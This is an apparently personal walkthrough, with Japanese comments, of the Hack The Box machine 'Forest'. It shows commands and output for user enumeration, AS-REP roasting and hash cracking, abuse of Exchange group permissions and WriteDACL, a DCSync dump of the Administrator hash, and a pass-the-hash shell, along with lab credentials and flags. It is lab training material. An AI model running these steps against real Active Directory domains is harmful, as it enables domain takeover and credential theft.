https://app.hackthebox.com/machines/Forest

## STEP 1
```sh
└─$ rustscan -a 10.129.95.210 --no-banner --scripts none   
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.95.210:53
Open 10.129.95.210:88
Open 10.129.95.210:135
Open 10.129.95.210:139
Open 10.129.95.210:389
Open 10.129.95.210:445
Open 10.129.95.210:464
Open 10.129.95.210:593
Open 10.129.95.210:636
Open 10.129.95.210:3268
Open 10.129.95.210:3269
Open 10.129.95.210:5985
Open 10.129.95.210:9389
Open 10.129.95.210:47001
Open 10.129.95.210:49668
Open 10.129.95.210:49664
Open 10.129.95.210:49666
Open 10.129.95.210:49665
Open 10.129.95.210:49671
Open 10.129.95.210:49680
Open 10.129.95.210:49681
Open 10.129.95.210:49685
Open 10.129.95.210:49700
Open 10.129.95.210:49861
10.129.95.210 -> [53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49668,49664,49666,49665,49671,49680,49681,49685,49700,49861]
```


## STEP 2
クレデンシャルなしでユーザ列挙できた
```sh
└─$ netexec smb -u '' -p '' --users-export users.txt 10.129.95.210
SMB         10.129.95.210   445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
SMB         10.129.95.210   445    FOREST           [+] htb.local\: 
SMB         10.129.95.210   445    FOREST           -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.95.210   445    FOREST           Administrator                 2021-08-31 00:51:58 0       Built-in account for administering the computer/domain 
SMB         10.129.95.210   445    FOREST           Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.95.210   445    FOREST           krbtgt                        2019-09-18 10:53:23 0       Key Distribution Center Service Account 
SMB         10.129.95.210   445    FOREST           DefaultAccount                <never>             0       A user account managed by the system. 
SMB         10.129.95.210   445    FOREST           $331000-VK4ADACQNUCA          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_2c8eef0a09b545acb          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_ca8c2ed5bdab4dc9b          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_75a538d3025e4db9a          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_681f53d4942840e18          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_1b41c9286325456bb          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_9b69f1b9d2cc45549          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_7c96b981967141ebb          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_c75ee099d0a64c91b          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_1ffab36a2f5f479cb          <never>             0        
SMB         10.129.95.210   445    FOREST           HealthMailboxc3d7722          2019-09-23 22:51:31 0        
SMB         10.129.95.210   445    FOREST           HealthMailboxfc9daad          2019-09-23 22:51:35 0        
SMB         10.129.95.210   445    FOREST           HealthMailboxc0a90c9          2019-09-19 11:56:35 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox670628e          2019-09-19 11:56:45 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox968e74d          2019-09-19 11:56:56 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox6ded678          2019-09-19 11:57:06 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox83d6781          2019-09-19 11:57:17 0        
SMB         10.129.95.210   445    FOREST           HealthMailboxfd87238          2019-09-19 11:57:27 0        
SMB         10.129.95.210   445    FOREST           HealthMailboxb01ac64          2019-09-19 11:57:37 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox7108a4e          2019-09-19 11:57:48 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox0659cc1          2019-09-19 11:57:58 0        
SMB         10.129.95.210   445    FOREST           sebastien                     2019-09-20 00:29:59 0        
SMB         10.129.95.210   445    FOREST           lucinda                       2019-09-20 00:44:13 0        
SMB         10.129.95.210   445    FOREST           svc-alfresco                  2025-07-05 13:17:35 0        
SMB         10.129.95.210   445    FOREST           andy                          2019-09-22 22:44:16 0        
SMB         10.129.95.210   445    FOREST           mark                          2019-09-20 22:57:30 0        
SMB         10.129.95.210   445    FOREST           santi                         2019-09-20 23:02:55 0        
SMB         10.129.95.210   445    FOREST           [*] Enumerated 31 local users: HTB
```
取得したユーザをasreproastしてみると、svc-alfrescoのチケットを取得できた
```sh
└─$ netexec ldap -u users.txt -p '' --asreproast asreproast.txt 10.129.95.210
LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        10.129.95.210   389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:f6124c873f10f1072f283b194fe7d7ad$f87e6e54a90d5a93c96a69609515448fe9204315832a41850bf6fe5f4cbbb841856407453586ef00ad5eead10e1e553116fbe8f170e80e4f5b4c7827a7150d347d374341d574e34202f18eaed0729e6417c67850a36554750dda865574a79093944594c37f8dbcbec4fb0915ab9213db7f02d558ca56531410276c2eded0e40114511b40526de586180c5c2c51d49f9c3e1bc1a23bab39aafbd44d7bb1c1dc6526acb9ca35ea356fb8ca779802898d6e7caaaa6ae87dac6be2065c8c8ee46073e0b23d9ecbe807a77c173763a311704f8621f496239008130cb844906641b7fb6bf14a8c3f91
```
ハッシュ形式を確認し、クラック成功！
```sh
└─$ nth -f asreproast.txt --no-banner --no-john 

$krb5asrep$23$svc-alfresco@HTB.LOCAL:f6124c873f10f1072f283b194fe7d7ad$f87e6e54a90d5a93c96a69609515448fe9204315832a41850bf6fe5f4cbbb841856407453586ef00ad5eead10e1e553116fbe8f170e80e4f5b4c7827a7150d347d374341d574e34202f18eaed0729e6417c678
50a36554750dda865574a79093944594c37f8dbcbec4fb0915ab9213db7f02d558ca56531410276c2eded0e40114511b40526de586180c5c2c51d49f9c3e1bc1a23bab39aafbd44d7bb1c1dc6526acb9ca35ea356fb8ca779802898d6e7caaaa6ae87dac6be2065c8c8ee46073e0b23d9ecbe807a77c
173763a311704f8621f496239008130cb844906641b7fb6bf14a8c3f91

Most Likely 
Kerberos 5 AS-REP etype 23, HC: 18200 Summary: Used for Windows Active Directory

└─$ hashcat -a 0 -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt --quiet
$krb5asrep$23$svc-alfresco@HTB.LOCAL:f6124c873f10f1072f283b194fe7d7ad$f87e6e54a90d5a93c96a69609515448fe9204315832a41850bf6fe5f4cbbb841856407453586ef00ad5eead10e1e553116fbe8f170e80e4f5b4c7827a7150d347d374341d574e34202f18eaed0729e6417c67850a36554750dda865574a79093944594c37f8dbcbec4fb0915ab9213db7f02d558ca56531410276c2eded0e40114511b40526de586180c5c2c51d49f9c3e1bc1a23bab39aafbd44d7bb1c1dc6526acb9ca35ea356fb8ca779802898d6e7caaaa6ae87dac6be2065c8c8ee46073e0b23d9ecbe807a77c173763a311704f8621f496239008130cb844906641b7fb6bf14a8c3f91:s3rvice
```
取得したクレデンシャルでwinrmログイン成功！ユーザフラグゲット
```sh
└─$ netexec winrm 10.129.95.210 -u svc-alfresco -p s3rvice -X 'type C:\Users\svc-alfresco\Desktop\user.txt'         
WINRM       10.129.95.210   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.95.210   5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
WINRM       10.129.95.210   5985   FOREST           [+] Executed command (shell type: powershell)
WINRM       10.129.95.210   5985   FOREST           99cd42423fed1b4653b90355bcd52c11
```


## STEP 3
netexecでbloodhoundを回す
```sh
└─$ netexec ldap -d htb.local --dns-server 10.129.95.210 -u svc-alfresco -p s3rvice --bloodhound --collection All 10.129.95.210
LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
LDAP        10.129.95.210   389    FOREST           [+] htb.local\svc-alfresco:s3rvice 
LDAP        10.129.95.210   389    FOREST           Resolved collection methods: rdp, psremote, dcom, trusts, objectprops, container, localadmin, session, group, acl
LDAP        10.129.95.210   389    FOREST           Done in 01M 58S
LDAP        10.129.95.210   389    FOREST           Compressing output into /home/kali/.nxc/logs/FOREST_10.129.95.210_2025-07-11_213653_bloodhound.zip
```
図から考えられる攻撃パスは
1. genericall権限によりsvc-alfresoを「EXCHANGE WINDOWS PERMISSIONS」グループに追加
2. writedacl権限によりドメイン「htb.local」に対するフルコン権限をsvc-alfresoに付与
3. dcsync攻撃によりadministratorのntハッシュ取得
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Forest_01.png">

genericall権限で、svc-alfrescoを「EXCHANGE WINDOWS PERMISSIONS」グループに追加
```sh
└─$ net rpc group addmem 'EXCHANGE WINDOWS PERMISSIONS' svc-alfresco -U 'htb.local/svc-alfresco%s3rvice' -S 10.129.95.210 
                                                                                                                                 
└─$ net rpc group members 'EXCHANGE WINDOWS PERMISSIONS' -U 'htb.local/svc-alfresco%s3rvice' -S 10.129.95.210 
HTB\Exchange Trusted Subsystem
HTB\svc-alfresco
```
writedaclを利用して、「htb.local」に対するフルコントロールをsvc-alfrescoに付与  
```sh
└─$ impacket-dacledit -ts -dc-ip 10.129.95.210 -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' -action write -rights FullControl 'htb.local/svc-alfresco:s3rvice'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-08-17 17:46:32] [*] DACL backed up to dacledit-20250817-174632.bak
[2025-08-17 17:46:33] [*] DACL modified successfully!

└─$ impacket-dacledit -ts -dc-ip 10.129.95.210 -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' -action read -ace-type allowed  'htb.local/svc-alfresco:s3rvice'             
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-08-17 17:46:54] [*] Parsing DACL
[2025-08-17 17:47:26] [*] Printing parsed DACL
[2025-08-17 17:47:26] [*] Filtering results for SID (S-1-5-21-3072663084-364016917-1341370565-1147)
[2025-08-17 17:47:26] [*]   ACE[116] info                
[2025-08-17 17:47:26] [*]     ACE Type                  : ACCESS_ALLOWED_ACE
[2025-08-17 17:47:26] [*]     ACE flags                 : None
[2025-08-17 17:47:26] [*]     Access mask               : FullControl (0xf01ff)
[2025-08-17 17:47:26] [*]     Trustee (SID)             : svc-alfresco (S-1-5-21-3072663084-364016917-1341370565-1147)
```
フルコン権限でdcsync攻撃
```sh
└─$ netexec smb 10.129.95.210 -u 'htb.local\svc-alfresco' -p s3rvice --ntds drsuapi --user administrator
SMB         10.129.95.210   445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.129.95.210   445    FOREST           [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         10.129.95.210   445    FOREST           [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.95.210   445    FOREST           htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
SMB         10.129.95.210   445    FOREST           [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/ntds/FOREST_10.129.95.210_2025-08-17_215354.ntds of which 1 were added to the database
SMB         10.129.95.210   445    FOREST           [*] To extract only enabled accounts from the output file, run the following command: 
SMB         10.129.95.210   445    FOREST           [*] cat /home/kali/.nxc/logs/ntds/FOREST_10.129.95.210_2025-08-17_215354.ntds | grep -iv disabled | cut -d ':' -f1
SMB         10.129.95.210   445    FOREST           [*] grep -iv disabled /home/kali/.nxc/logs/ntds/FOREST_10.129.95.210_2025-08-17_215354.ntds | cut -d ':' -f1
```
administratorのハッシュでログイン成功！ルートフラグゲット
```powreshell
└─$ evil-winrm -i 10.129.95.210 -u administrator -H '32693b11e6aa90eb43d32c72a07ceea6' 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
5c6fa808761efe8e6e847de1d5a6ebb2
```
